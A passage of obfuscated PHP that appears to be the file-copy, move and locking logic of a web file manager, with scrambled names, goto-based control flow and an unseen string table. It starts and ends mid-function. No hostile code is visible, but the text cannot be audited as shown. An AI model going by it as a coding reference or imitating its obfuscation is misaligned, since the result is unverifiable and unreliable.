A±Ú‡ÈäÉ: $D†°´ØôÌ =& $_SERVER[ç]; if (!$this->allowLock()) { return; } $a§åÙÔ©Ò = 0; goto b»ÁõËöà; b»ÁõËöà: $this->_lockKey($D†°´ØôÌ[519] . $E²•¿¨çÇ„, $a§åÙÔ©Ò); $this->_lockEvent($E²•¿¨çÇ„, array($D†°´ØôÌ[513], $D†°´ØôÌ[514]), $a§åÙÔ©Ò); $this->_lockParent($E²•¿¨çÇ„, array($D†°´ØôÌ[513], $D†°´ØôÌ[515]), $a§åÙÔ©Ò); goto B²³Ÿ‰±ø; B²³Ÿ‰±ø: $this->_lockEvent($E²•¿¨çÇ„, array($D†°´ØôÌ[520], $D†°´ØôÌ[516], $D†°´ØôÌ[517]), $a§åÙÔ©Ò); goto bÃÑ¦‡ù˜; bÃÑ¦‡ù˜: } private function _lockCheck($BàøÏªßõÎ, $bë¹œƒËà) { goto aÔöœ›È¢; AÎ¾ÁÙµ¿£: $fòÇ÷áÖºİ = array_reverse($this->parentLevelArray($E¥ÚÚïÛ¸Ş[$cÉÀŒÀ‚«†[481]])); foreach ($fòÇ÷áÖºİ as $C±„¨Ë) { $A—èŒö´† = $BàøÏªßõÎ . $cÉÀŒÀ‚«†[522] . $C±„¨Ë; if (CacheLock::lockGet($cÉÀŒÀ‚«†[523] . $A—èŒö´†)) { $E¥ÚÚïÛ¸Ş = $this->sourceInfo($C±„¨Ë); CacheLock::setErrorMsg($cÉÀŒÀ‚«†[159] . htmlspecialchars($E¥ÚÚïÛ¸Ş[$cÉÀŒÀ‚«†[28]]) . $cÉÀŒÀ‚«†[499] . $a…ñŞ‡ëÓ²); $this->_lockKey($A—èŒö´†, 1); $this->_lockKey($A—èŒö´†, 0); } } goto b–ÆÒÒ»‰–; AğöÀÂ—®¨: $this->_lockTimeStart[$A—èŒö´†] = timeFloat(); if (!is_array($E¥ÚÚïÛ¸Ş)) { return; } $a…ñŞ‡ëÓ² = LNG($cÉÀŒÀ‚«†[521]); goto bÉæÓÇ™; aÔöœ›È¢: $cÉÀŒÀ‚«† =& $_SERVER[ç]; $E¥ÚÚïÛ¸Ş = $this->sourceInfo($bë¹œƒËà); $A—èŒö´† = $BàøÏªßõÎ . $cÉÀŒÀ‚«†[94] . $bë¹œƒËà; goto AğöÀÂ—®¨; bÉæÓÇ™: CacheLock::setErrorMsg($cÉÀŒÀ‚«†[159] . htmlspecialchars($E¥ÚÚïÛ¸Ş[$cÉÀŒÀ‚«†[28]]) . $cÉÀŒÀ‚«†[499] . $a…ñŞ‡ëÓ²); $this->_lockKey($A—èŒö´†, 1); $this->_lockKey($A—èŒö´†, 0); goto AÎ¾ÁÙµ¿£; b–ÆÒÒ»‰–: } private function _lockCheckEnd($E™ŠÙ¾¼İ, $dÖ‹¢·İá) { goto D¥Ö»÷›²á; D¥Ö»÷›²á: $F£Šœâ°„ =& $_SERVER[ç]; $Aåµ¸‘°…ª = $E™ŠÙ¾¼İ . $F£Šœâ°„[94] . $dÖ‹¢·İá; CacheLock::setErrorMsg($F£Šœâ°„[373]); goto d“ŒğÄ™ˆ; d“ŒğÄ™ˆ: if (!isset($this->_lockTimeStart[$Aåµ¸‘°…ª])) { return; } $FÊÂïççÁé = timeFloat() - $this->_lockTimeStart[$Aåµ¸‘°…ª]; unset($this->_lockTimeStart[$Aåµ¸‘°…ª]); goto b³èœŸ±Ê…; b³èœŸ±Ê…: if ($FÊÂïççÁé > 0.5) { unset(self::$cacheSourceInfo[$F£Šœâ°„[432] . $dÖ‹¢·İá]); } $c„Å„²äÖœ = $this->sourceInfo($dÖ‹¢·İá); if (!$c„Å„²äÖœ) { show_json(LNG($F£Šœâ°„[104]), !1); } goto CÖÇÜ‹…âÑ; CÖÇÜ‹…âÑ: } private function _lockParent($EÉ§¤çÖ», $c†ŞŠ™«‚Û, $B³èå¥›„Ü) { if (!$this->autoLockSet) { return; } $Cö¾ÉÛ«ì† = $this->sourceInfo($EÉ§¤çÖ»); if (!is_array($Cö¾ÉÛ«ì†)) { return; } $AÅÕ˜èÌ­¯ = array_reverse($this->parentLevelArray($Cö¾ÉÛ«ì†[$_SERVER[ç][481]])); foreach ($AÅÕ˜èÌ­¯ as $B»Ô¥¹œäŞ) { $this->_lockEvent($B»Ô¥¹œäŞ, $c†ŞŠ™«‚Û, $B³èå¥›„Ü); } } private function _lockEvent($B§´­Ğ“¤Û, $dëè¢¨Ñ¡, $A‹·±è¬Ì¸) { $Fˆ›Õ¿Äø =& $_SERVER[ç]; if (!$this->autoLockSet) { return; } foreach ($dëè¢¨Ñ¡ as $e¶Ã£Ò„äÁ) { $BÈ¬ î½—ê = $e¶Ã£Ò„äÁ . $Fˆ›Õ¿Äø[94] . $B§´­Ğ“¤Û; if ($A‹·±è¬Ì¸ && CacheLock::lockGet($Fˆ›Õ¿Äø[523] . $BÈ¬ î½—ê)) { continue; } $this->_lockKey($BÈ¬ î½—ê, $A‹·±è¬Ì¸); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($BÂ¦„Áƒˆ¦, $cŠ–µƒÙ­¢ = 1) { $b³äØ¡ô = $_SERVER[ç][523] . md5($BÂ¦„Áƒˆ¦); if ($cŠ–µƒÙ­¢) { if (isset(self::$_lockItemArr[$b³äØ¡ô])) { return; } self::$_lockItemArr[$b³äØ¡ô] = 1; CacheLock::lock($b³äØ¡ô, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b³äØ¡ô])) { return; } unset(self::$_lockItemArr[$b³äØ¡ô]); CacheLock::unlock($b³äØ¡ô); } } public function isParentOf($CŞŠ¢ÌÄğ, $C ª»‚Û†‰) { goto e´ÔµŞóÆœ; e´ÔµŞóÆœ: $bÖ ŒÛ…Ó =& $_SERVER[ç]; $E×Å‚Üƒëê = $this->sourceInfo($CŞŠ¢ÌÄğ); $AŠÚ‘òéİ = $this->sourceInfo($C ª»‚Û†‰); goto CƒÖŠœùÔà; CƒÖŠœùÔà: $ağÚ‰ƒß°´ = $E×Å‚Üƒëê[$bÖ ŒÛ…Ó[481]] . $E×Å‚Üƒëê[$bÖ ŒÛ…Ó[390]] . $bÖ ŒÛ…Ó[47]; $fˆÕÇ’í ¡ = $AŠÚ‘òéİ[$bÖ ŒÛ…Ó[481]] . $AŠÚ‘òéİ[$bÖ ŒÛ…Ó[390]] . $bÖ ŒÛ…Ó[47]; $A ÀÙËí†¼ = strpos($fˆÕÇ’í ¡, $ağÚ‰ƒß°´) === 0; goto B¿Ûœ™¨é¶; B¿Ûœ™¨é¶: return $A ÀÙËí†¼; goto B·Ó÷¾ßƒ¤; B·Ó÷¾ßƒ¤: } private $targetIsDelete = 0; public function copy($d†¹î›ÙÎ, $D·â¿ì¯™­, $f³“İÛåÍ· = REPEAT_REPLACE, $Dæ¹áÉ›Ì = '') { goto A›íœ Û¬í; dÙ‡ßË—¦Â: if (!$B¾ğ¤·¥í || !$fèµ’ÜÆòê || $fèµ’ÜÆòê[$e½Ä½·Ü«Æ[397]] != $e½Ä½·Ü«Æ[86]) { return !1; } if ($this->isParentOf($d†¹î›ÙÎ, $D·â¿ì¯™­)) { return !1; } $A‹ÆÇ»êÂé = $Dæ¹áÉ›Ì ? $Dæ¹áÉ›Ì : $B¾ğ¤·¥í[$e½Ä½·Ü«Æ[28]]; goto C‹ïµ¼–; C‹ïµ¼–: $this->lockCopyStart($d†¹î›ÙÎ); $this->lockWriteStart($D·â¿ì¯™­, $A‹ÆÇ»êÂé); $b˜öÒÒˆÙ = array($e½Ä½·Ü«Æ[524] => array(), $e½Ä½·Ü«Æ[525] => array(), $e½Ä½·Ü«Æ[526] => array()); goto cĞÛ„¥‚ÁÒ; A««äî–ã•: if ($B¾ğ¤·¥í[$e½Ä½·Ü«Æ[397]] == $e½Ä½·Ü«Æ[86] && $f–°¼“Œ == $C‡ˆïŒÎá) { $this->folderSizeResetChildren($f–°¼“Œ); } Model($e½Ä½·Ü«Æ[527])->addAll($b˜öÒÒˆÙ[$e½Ä½·Ü«Æ[525]], array(), !0); if ($f–°¼“Œ != $C‡ˆïŒÎá || $B¾ğ¤·¥í[$e½Ä½·Ü«Æ[397]] == $e½Ä½·Ü«Æ[86]) { Model($e½Ä½·Ü«Æ[528])->eventCopy($C‡ˆïŒÎá); } goto Dä§Ç°¤»; cĞÛ„¥‚ÁÒ: $this->targetIsDelete = intval($B¾ğ¤·¥í[$e½Ä½·Ü«Æ[417]]); $f–°¼“Œ = $this->fileNameExistCache($D·â¿ì¯™­, $B¾ğ¤·¥í[$e½Ä½·Ü«Æ[28]]); $C‡ˆïŒÎá = $this->_copy($d†¹î›ÙÎ, $D·â¿ì¯™­, $f³“İÛåÍ·, $b˜öÒÒˆÙ, !0, $Dæ¹áÉ›Ì); goto fËŒò¸–Àµ; A›íœ Û¬í: $e½Ä½·Ü«Æ =& $_SERVER[ç]; $B¾ğ¤·¥í = $this->sourceInfo($d†¹î›ÙÎ); $fèµ’ÜÆòê = $this->sourceInfo($D·â¿ì¯™­); goto dÙ‡ßË—¦Â; aí¶ö¥µ¥Ú: $this->updateModifyTime($D·â¿ì¯™­); return $C‡ˆïŒÎá; goto bÆñ§Šâ²×; fËŒò¸–Àµ: $this->_childrenListClear(); $this->lockCopyEnd($d†¹î›ÙÎ); $this->lockWriteEnd($D·â¿ì¯™­, $A‹ÆÇ»êÂé); goto A««äî–ã•; Dä§Ç°¤»: $this->saveAll($b˜öÒÒˆÙ[$e½Ä½·Ü«Æ[526]]); Model($e½Ä½·Ü«Æ[173])->linkAdd($b˜öÒÒˆÙ[$e½Ä½·Ü«Æ[524]]); $this->folderSizeReset($D·â¿ì¯™­); goto aí¶ö¥µ¥Ú; bÆñ§Šâ²×: } private function _copy($A¯Ş¶Æó¶´, $d²Ææ™“ø¡, $D¡ï™ÇĞ‹ù, &$b…·®±÷·Ô, $aƒƒº‹ë¯«, $A½ğÉÚô˜ô = '') { goto f§‰Ò¡õ‰ó; f§‰Ò¡õ‰ó: $Bƒë«ê±‡š =& $_SERVER[ç]; $cñæ­†öƒƒ = $this->sourceInfoCache($A¯Ş¶Æó¶´); $F‘¨–š™§¸ = $cñæ­†öƒƒ[$Bƒë«ê±‡š[397]] == $Bƒë«ê±‡š[86]; goto D–º÷‚‚ñº; bš˜ó„ì…Ø: return $f¥»ÊæÎ“”; goto Cæâ†ïÁ‚Ê; D–º÷‚‚ñº: $f¨¢ÜÔŒ‰Ò = $A½ğÉÚô˜ô ? $A½ğÉÚô˜ô : $cñæ­†öƒƒ[$Bƒë«ê±‡š[28]]; $aµñÀ»¶Ùá = $this->fileNameExistCache($d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò); if ($aƒƒº‹ë¯«) { $this->_childrenAllMake($A¯Ş¶Æó¶´); if ($F‘¨–š™§¸ && $aµñÀ»¶Ùá) { $this->_childrenAllMake($aµñÀ»¶Ùá); } } goto cå˜Å´ïÌ; cå˜Å´ïÌ: if (!$aµñÀ»¶Ùá) { return $this->_copyCreate($A¯Ş¶Æó¶´, $d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò, $b…·®±÷·Ô); } $f¥»ÊæÎ“” = $aµñÀ»¶Ùá; if ($F‘¨–š™§¸) { if ($D¡ï™ÇĞ‹ù == REPEAT_RENAME_FOLDER) { $f¨¢ÜÔŒ‰Ò = $this->fileNameAutoCache($d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò, $D¡ï™ÇĞ‹ù, $F‘¨–š™§¸); $f¥»ÊæÎ“” = $this->_copyCreate($A¯Ş¶Æó¶´, $d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò, $b…·®±÷·Ô); } else { $a‘æ‡¾ÎÏÉ = $this->_childrenList($A¯Ş¶Æó¶´); foreach ($a‘æ‡¾ÎÏÉ as $B½‚ñÍŸ¬Î) { $this->_copy($B½‚ñÍŸ¬Î[$Bƒë«ê±‡š[390]], $aµñÀ»¶Ùá, $D¡ï™ÇĞ‹ù, $b…·®±÷·Ô, !1); } } } else { if ($D¡ï™ÇĞ‹ù == REPEAT_RENAME || $D¡ï™ÇĞ‹ù == REPEAT_RENAME_FOLDER) { $f¨¢ÜÔŒ‰Ò = $this->fileNameAutoCache($d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò, $D¡ï™ÇĞ‹ù, $F‘¨–š™§¸); $f¥»ÊæÎ“” = $this->_copyCreate($A¯Ş¶Æó¶´, $d²Ææ™“ø¡, $f¨¢ÜÔŒ‰Ò, $b…·®±÷·Ô); } else { if ($D¡ï™ÇĞ‹ù == REPEAT_REPLACE) { $Cª£„¶³ = $this->sourceInfoCache($aµñÀ»¶Ùá); $bíÑ©Öæù = $this->fileHistory($Cª£„¶³, $cñæ­†öƒƒ[$Bƒë«ê±‡š[441]], $cñæ­†öƒƒ[$Bƒë«ê±‡š[77]]); if ($bíÑ©Öæù) { $b…·®±÷·Ô[$Bƒë«ê±‡š[524]][] = $cñæ­†öƒƒ[$Bƒë«ê±‡š[441]]; } } else { if ($D¡ï™ÇĞ‹ù == REPEAT_SKIP) { } } } Hook::trigger($Bƒë«ê±‡š[529], array($Bƒë«ê±‡š[530], $cñæ­†öƒƒ, 0)); } goto bš˜ó„ì…Ø; Cæâ†ïÁ‚Ê: } private function _copyCreate($E‚÷‘…Úß, $bôñ¹¾Í”°, $B¬åØ„‘©µ, &$A‡Ò Î®Ü) { goto f‹ˆ¨Ô’Ê; föø±»òé¬: $EİçÙÏ› = $this->add($Aé’µ°ƒëÆ); $FÏ†—éÍ»‘ = array($bšçñâÙì‹[390] => $EİçÙÏ›, $bšçñâÙì‹[28] => $B¬åØ„‘©µ); $this->_copyApplyMeta($FÏ†—éÍ»‘, $A‡Ò Î®Ü); goto BÇ°Â¥‡™Ú; d¶§Ø¯ Ã¾: $AË²ˆ¢Ğô™[$E‚÷‘…Úß] = $EİçÙÏ›; $F½ ‚……¤ë = array(); $E´šºÏÁ²© = array(); goto fÑ‰éˆº¼æ; BÇ°Â¥‡™Ú: if ($B¬£âÉ¼áï[$bšçñâÙì‹[397]] != $bšçñâÙì‹[86]) { $A‡Ò Î®Ü[$bšçñâÙì‹[524]][] = $B¬£âÉ¼áï[$bšçñâÙì‹[441]]; return $EİçÙÏ›; } $c·¼Şµ³Ö = array(); $cÎÌƒ‹¥àº = array(); goto DˆøÊ‡çÖ¹; f‹ˆ¨Ô’Ê: $bšçñâÙì‹ =& $_SERVER[ç]; $B¬£âÉ¼áï = $this->sourceInfoCache($E‚÷‘…Úß); $eÃÆ÷ß¿¹– = $this->sourceInfoCache($bôñ¹¾Í”°); goto D»Ã•ÀÙñ ; fÑ‰éˆº¼æ: foreach ($c‚÷çÈÉ‹Ä as $d¶âÚ¬²«õ) { $F‡ù²Ø£¦ = $d¶âÚ¬²«õ[$bšçñâÙì‹[390]]; $e õŒ”Æ“£ = $this->_childrenMatch($AË²ˆ¢Ğô™, $d¶âÚ¬²«õ, $BƒÂ½Ìï); $F½ ‚……¤ë[] = array($bšçñâÙì‹[390], $F‡ù²Ø£¦, $bšçñâÙì‹[472], $e õŒ”Æ“£[$bšçñâÙì‹[472]]); $E´šºÏÁ²©[] = array($bšçñâÙì‹[390], $F‡ù²Ø£¦, $bšçñâÙì‹[481], $e õŒ”Æ“£[$bšçñâÙì‹[481]]); $this->_copyApplyMeta($d¶âÚ¬²«õ, $A‡Ò Î®Ü); if ($d¶âÚ¬²«õ[$bšçñâÙì‹[397]] != $bšçñâÙì‹[86]) { $A‡Ò Î®Ü[$bšçñâÙì‹[524]][] = $d¶âÚ¬²«õ[$bšçñâÙì‹[441]]; } } $this->chunkEventSet($bšçñâÙì‹[536], array($bšçñâÙì‹[537], $Aé’µ°ƒëÆ, $aÖÂ˜³ˆ‹à)); $this->saveAll($F½ ‚……¤ë); goto f¶Ù˜äØ; DˆøÊ‡çÖ¹: $this->_childrenListAll($E‚÷‘…Úß, $c·¼Şµ³Ö); $aÖÂ˜³ˆ‹à = count($c·¼Şµ³Ö); if ($aÖÂ˜³ˆ‹à == 0) { return $EİçÙÏ›; } goto cï†à†ÜÚ«; cï†à†ÜÚ«: $BƒÂ½Ìï = $this->sourceInfo($EİçÙÏ›); foreach ($c·¼Şµ³Ö as $d¶âÚ¬²«õ) { $A¦Ò‰÷í‰æ = $this->_makeItemData($d¶âÚ¬²«õ, $BƒÂ½Ìï, $d¶âÚ¬²«õ[$bšçñâÙì‹[28]]); $A¦Ò‰÷í‰æ[$bšçñâÙì‹[481]] = $d¶âÚ¬²«õ[$bšçñâÙì‹[481]]; $cÎÌƒ‹¥àº[] = $A¦Ò‰÷í‰æ; } $this->chunkEventSet($bšçñâÙì‹[534], array($bšçñâÙì‹[535], $Aé’µ°ƒëÆ, $aÖÂ˜³ˆ‹à)); goto BÁÚ«Ï³È; D»Ã•ÀÙñ : $Aé’µ°ƒëÆ = $this->_makeItemData($B¬£âÉ¼áï, $eÃÆ÷ß¿¹–, $B¬åØ„‘©µ); Hook::trigger($bšçñâÙì‹[531], $Aé’µ°ƒëÆ); Hook::trigger($bšçñâÙì‹[532], array($bšçñâÙì‹[533], $Aé’µ°ƒëÆ, 0)); goto föø±»òé¬; BÁÚ«Ï³È: $this->addAll($cÎÌƒ‹¥àº, array(), !1); $c‚÷çÈÉ‹Ä = $this->where(array($bšçñâÙì‹[472] => $EİçÙÏ›))->select(); $AË²ˆ¢Ğô™ = $this->_childrenMakeRelation($c·¼Şµ³Ö, $c‚÷çÈÉ‹Ä); goto d¶§Ø¯ Ã¾; f¶Ù˜äØ: $this->chunkEventSet($bšçñâÙì‹[538], array($bšçñâÙì‹[539], $Aé’µ°ƒëÆ, $aÖÂ˜³ˆ‹à)); $this->saveAll($E´šºÏÁ²©); return $EİçÙÏ›; goto dàêÊ¬ê¦; dàêÊ¬ê¦: } private function _childrenMakeRelation($f®±ïÓõ¢¼, $eÃÂé×±Ã„) { $a„®°£¥ =& $_SERVER[ç]; $F½š¯Óè = array(); $cù½’ìôÓ = array(); foreach ($f®±ïÓõ¢¼ as $føÔğİ‘ë) { $DšÆ™õÓº = $føÔğİ‘ë[$a„®°£¥[28]] . $a„®°£¥[8] . $føÔğİ‘ë[$a„®°£¥[481]]; $F½š¯Óè[$DšÆ™õÓº] = $føÔğİ‘ë[$a„®°£¥[390]]; } foreach ($eÃÂé×±Ã„ as $føÔğİ‘ë) { $DšÆ™õÓº = $føÔğİ‘ë[$a„®°£¥[28]] . $a„®°£¥[8] . $føÔğİ‘ë[$a„®°£¥[481]]; $A…í’…É¤ö = $F½š¯Óè[$DšÆ™õÓº]; $cù½’ìôÓ[$A…í’…É¤ö] = $føÔğİ‘ë[$a„®°£¥[390]]; } return $cù½’ìôÓ; } private function _childrenMatch($dÔà©®­ÈÒ, $då¥´…êâ, $fÈ„Š·íËæ) { goto Døœòî—é¯; Døœòî—é¯: $bÓ‡¾¡ø¹™ =& $_SERVER[ç]; $D…‚£ã‘ŸË = $fÈ„Š·íËæ[$bÓ‡¾¡ø¹™[481]]; $d×Ú‹É³ã = $this->parentLevelArray($då¥´…êâ[$bÓ‡¾¡ø¹™[481]]); goto cé˜‹¶ê¤Î; AÊ“Âø†ƒ»: $FÉ†İèÄ¿÷ = $däééèœß’[count($däééèœß’) - 1]; return array($bÓ‡¾¡ø¹™[472] => $FÉ†İèÄ¿÷, $bÓ‡¾¡ø¹™[481] => $D…‚£ã‘ŸË); goto aÍ©¯ğ†øá; cé˜‹¶ê¤Î: foreach ($d×Ú‹É³ã as $CÁìœè‘—·) { if (isset($dÔà©®­ÈÒ[$CÁìœè‘—·])) { $D…‚£ã‘ŸË .= $dÔà©®­ÈÒ[$CÁìœè‘—·] . $bÓ‡¾¡ø¹™[540]; } } $D…‚£ã‘ŸË = rtrim($D…‚£ã‘ŸË, $bÓ‡¾¡ø¹™[47]) . $bÓ‡¾¡ø¹™[47]; $däééèœß’ = $this->parentLevelArray($D…‚£ã‘ŸË); goto AÊ“Âø†ƒ»; aÍ©¯ğ†øá: } private function _makeItemData($DÜØ†Äï°É, $d……‰™Ø”æ, $c…àã²Ï«æ) { $f­»©ÁÎ¡¢ =& $_SERVER[ç]; $BîĞŠÊá†ª = array($f­»©ÁÎ¡¢[541] => $DÜØ†Äï°É[$f­»©ÁÎ¡¢[397]], $f­»©ÁÎ¡¢[407] => $c…àã²Ï«æ, $f­»©ÁÎ¡¢[542] => $DÜØ†Äï°É[$f­»©ÁÎ¡¢[399]], $f­»©ÁÎ¡¢[442] => $DÜØ†Äï°É[$f­»©ÁÎ¡¢[441]], $f­»©ÁÎ¡¢[543] => $DÜØ†Äï°É[$f­»©ÁÎ¡¢[77]], $f­»©ÁÎ¡¢[544] => $d……‰™Ø”æ[$f­»©ÁÎ¡¢[398]], $f­»©ÁÎ¡¢[545] => $d……‰™Ø”æ[$f­»©ÁÎ¡¢[478]], $f­»©ÁÎ¡¢[546] => USER_ID, $f­»©ÁÎ¡¢[547] => USER_ID, $f­»©ÁÎ¡¢[389] => $d……‰™Ø”æ[$f­»©ÁÎ¡¢[390]], $f­»©ÁÎ¡¢[548] => $d……‰™Ø”æ[$f­»©ÁÎ¡¢[481]] . $d……‰™Ø”æ[$f­»©ÁÎ¡¢[390]] . $f­»©ÁÎ¡¢[47], $f­»©ÁÎ¡¢[416] => 0, $f­»©ÁÎ¡¢[549] => $f­»©ÁÎ¡¢[33]); return $BîĞŠÊá†ª; } private function _copyApplyMeta($CøØ±¹Àí¦, &$fŒíê¼ÚÂô) { $f™íŒïá’Ó =& $_SERVER[ç]; $a”ÑèÛì×® = $CøØ±¹Àí¦[$f™íŒïá’Ó[390]]; $C¥Å‰Òˆƒ® = $CøØ±¹Àí¦[$f™íŒïá’Ó[28]]; if (!isset($CøØ±¹Àí¦[$f™íŒïá’Ó[550]]) || !$CøØ±¹Àí¦[$f™íŒïá’Ó[550]] || $CøØ±¹Àí¦[$f™íŒïá’Ó[550]] == $f™íŒïá’Ó[491]) { $fŒíê¼ÚÂô[$f™íŒïá’Ó[526]][] = array($f™íŒïá’Ó[390], $a”ÑèÛì×®, $f™íŒïá’Ó[550], short_id($a”ÑèÛì×®)); } if (Input::check($C¥Å‰Òˆƒ®, $f™íŒïá’Ó[551])) { $fŒíê¼ÚÂô[$f™íŒïá’Ó[525]][] = array($f™íŒïá’Ó[390] => $a”ÑèÛì×®, $f™íŒïá’Ó[92] => $f™íŒïá’Ó[438], $f™íŒïá’Ó[370] => str_replace($f™íŒïá’Ó[50], $f™íŒïá’Ó[33], Pinyin::encode($C¥Å‰Òˆƒ®))); $fŒíê¼ÚÂô[$f™íŒïá’Ó[525]][] = array($f™íŒïá’Ó[390] => $a”ÑèÛì×®, $f™íŒïá’Ó[92] => $f™íŒïá’Ó[437], $f™íŒïá’Ó[370] => Pinyin::encode($C¥Å‰Òˆƒ®, $f™íŒïá’Ó[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($eŸÊ¹ÄæÓ¾) { goto cßÒ­£…“Á; dçÜÀÕÒà™: $cŒ×÷¯™ÔÆ = array_to_keyvalue($cŒ×÷¯™ÔÆ, $A‚ÜîœÛ¤ô[390]); foreach ($cŒ×÷¯™ÔÆ as $EÀÆ«Ş—–) { $DÂÆãá¦Á¤ = $EÀÆ«Ş—–[$A‚ÜîœÛ¤ô[472]]; $eŸÊ¹ÄæÓ¾ = $EÀÆ«Ş—–[$A‚ÜîœÛ¤ô[390]]; if (!isset($this->_childrenListCache[$eŸÊ¹ÄæÓ¾]) && $EÀÆ«Ş—–[$A‚ÜîœÛ¤ô[397]] == $A‚ÜîœÛ¤ô[86]) { $this->_childrenListCache[$eŸÊ¹ÄæÓ¾] = array(); } if (!isset($this->_childrenListCache[$DÂÆãá¦Á¤])) { $this->_childrenListCache[$DÂÆãá¦Á¤] = array(); } $this->_childrenListCache[$DÂÆãá¦Á¤][$eŸÊ¹ÄæÓ¾] = $EÀÆ«Ş—–; $this->_childrenItemCache[$eŸÊ¹ÄæÓ¾] = $EÀÆ«Ş—–; } goto c¤Á›‹Ç•ğ; cßÒ­£…“Á: $A‚ÜîœÛ¤ô =& $_SERVER[ç]; $E½Æï° = $this->sourceInfo($eŸÊ¹ÄæÓ¾); $E’Û±«İš = $A‚ÜîœÛ¤ô[418]; goto fÚ‚Ú’Ğ¼Ø; fÚ‚Ú’Ğ¼Ø: $d®Ïœ´òÍ = array($A‚ÜîœÛ¤ô[481] => array($A‚ÜîœÛ¤ô[507], $E½Æï°[$A‚ÜîœÛ¤ô[481]] . $eŸÊ¹ÄæÓ¾ . $A‚ÜîœÛ¤ô[508]), $A‚ÜîœÛ¤ô[417] => $this->targetIsDelete); $cŒ×÷¯™ÔÆ = $this->field($E’Û±«İš)->where($d®Ïœ´òÍ)->select(); if (!$cŒ×÷¯™ÔÆ) { return; } goto dçÜÀÕÒà™; c¤Á›‹Ç•ğ: } private function _childrenListAll($E¬ª…Ûœã, &$dÀØÌ¤»™) { $e·‹«ßÚï• =& $_SERVER[ç]; if (!isset($this->_childrenListCache[$E¬ª…Ûœã])) { return; } $a¨ïô¦¡ÂÌ = $this->_childrenListCache[$E¬ª…Ûœã]; foreach ($a¨ïô¦¡ÂÌ as $CĞä Ğª‘ => $B–¸š¼©®Œ) { $dÀØÌ¤»™[$CĞä Ğª‘] = $B–¸š¼©®Œ; if ($B–¸š¼©®Œ[$e·‹«ßÚï•[397]] == $e·‹«ßÚï•[86]) { $this->_childrenListAll($CĞä Ğª‘, $dÀØÌ¤»™); } } } private function sourceInfoCache($AƒÄ“†œïã) { if (isset($this->_childrenItemCache[$AƒÄ“†œïã])) { return $this->_childrenItemCache[$AƒÄ“†œïã]; } return $this->sourceInfo($AƒÄ“†œïã); } private function _childrenList($dŸ­¿¯½¶Ù) { if (isset($this->_childrenListCache[$dŸ­¿¯½¶Ù])) { return $this->_childrenListCache[$dŸ­¿¯½¶Ù]; } return $this->_childrenListSelect($dŸ­¿¯½¶Ù); } private function _childrenListSelect($d¸Òâ‘í†š) { goto FÌôôÏåØ; BŸíâ¨ã®‹: $aƒœËœ½½ø = $aƒœËœ½½ø ? $aƒœËœ½½ø : array(); $b£ËÊ³Ş„ = array_to_keyvalue($aƒœËœ½½ø, $fãÖ¡„Ú–¨[390]); $this->_childrenListCache[$d¸Òâ‘í†š] = $b£ËÊ³Ş„; goto E¸çõö˜İÑ; E¸çõö˜İÑ: foreach ($b£ËÊ³Ş„ as $d¸Òâ‘í†š => $d¯ßÄ•‡–Ó) { $this->_childrenItemCache[$d¸Òâ‘í†š] = $d¯ßÄ•‡–Ó; } return $b£ËÊ³Ş„; goto BÄ…›ÙĞè‘; FÌôôÏåØ: $fãÖ¡„Ú–¨ =& $_SERVER[ç]; $d…¬¸ŸØâ = array($fãÖ¡„Ú–¨[472] => $d¸Òâ‘í†š, $fãÖ¡„Ú–¨[417] => $this->targetIsDelete); $aƒœËœ½½ø = $this->where($d…¬¸ŸØâ)->select(); goto BŸíâ¨ã®‹; BÄ…›ÙĞè‘: } private function fileNameExistCache($b¢ô±×‘¬†, $cãóì†‹¬) { $cãÊ·£ñ‰… =& $_SERVER[ç]; $cãóì†‹¬ = strtolower($cãóì†‹¬); $F‡±ï¤‡ä‡ = $this->_childrenList($b¢ô±×‘¬†); foreach ($F‡±ï¤‡ä‡ as $DéÓ®¸¼) { if ($cãóì†‹¬ == strtolower($DéÓ®¸¼[$cãÊ·£ñ‰…[28]])) { return $DéÓ®¸¼[$cãÊ·£ñ‰…[390]]; } } return !1; } private function fileNameAutoCache($C«¶°…Ù†Ö, $C¬£Åî´Ù¬, $BÜ³¹“« , $aİ­ìå©Á•) { $aÇâãÏàÎÍ =& $_SERVER[ç]; $f©¿óÍ°êá = $this->_childrenList($C«¶°…Ù†Ö); $C´î¢ÒŒÓ = array_to_keyvalue($f©¿óÍ°êá, $aÇâãÏàÎÍ[33], $aÇâãÏàÎÍ[28]); return $this->fileNameAutoGet($C´î¢ÒŒÓ, $C¬£Åî´Ù¬, $BÜ³¹“« , $aİ­ìå©Á•); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Déê±ŒÒ’º, $e¼èàè¤Çï, $c´æ²‹Ó“ = REPEAT_REPLACE, $C„ä‹ÍÒ£ = '') { goto D·˜­ãñäß; E®­“¤¸‹¡: $this->updateModifyTime($EÛªÑîÇ×‘); Model($F”‘ºŒæ¿[528])->eventMove($Déê±ŒÒ’º, $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[472]], $e¼èàè¤Çï); Hook::trigger($F”‘ºŒæ¿[554], $fÃê¿êÏÛÇ); goto bª¾Û»äç; C¹®‚÷â¢: $this->folderSizeReset($e¼èàè¤Çï); $EÛªÑîÇ×‘ = array($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[472]], $e¼èàè¤Çï); if ($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[397]] == $F”‘ºŒæ¿[86]) { $EÛªÑîÇ×‘[] = $Déê±ŒÒ’º; } goto E®­“¤¸‹¡; AÊÏÀÍÄˆ: if ($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[472]] == $e¼èàè¤Çï && $C„ä‹ÍÒ£ != $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[28]]) { $Cò¿ÃµÚ† = $this->fileNameExist($e¼èàè¤Çï, $C„ä‹ÍÒ£); if ($Cò¿ÃµÚ† && $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[397]] == $F”‘ºŒæ¿[491]) { goto b¢Äò’Ìèô; a‹æ·È© ‘: return $Cò¿ÃµÚ†; goto a³î£Î¢êì; 